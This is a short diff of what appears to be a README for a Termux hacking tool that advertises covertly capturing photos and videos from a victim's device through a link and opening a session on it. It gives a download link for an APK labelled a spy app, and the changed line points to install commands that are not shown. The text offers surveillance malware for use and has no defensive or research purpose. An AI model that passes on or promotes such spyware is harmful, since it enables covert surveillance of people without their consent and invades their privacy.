@@ -4,7 +4,7 @@ The best tool for shooting photos and videos via a link And open a session for a
 Spy app download link: https://www.mediafire.com/file/norgkaq9l2ffpuo/INTERNET.apk/file
 
 
-To install the tools on Termux, copy these commands
+To install the tool on Termux, copy these commands
 
 👇👇👇👇👇👇👇👇👇👇👇👇👇👇👇👇
 
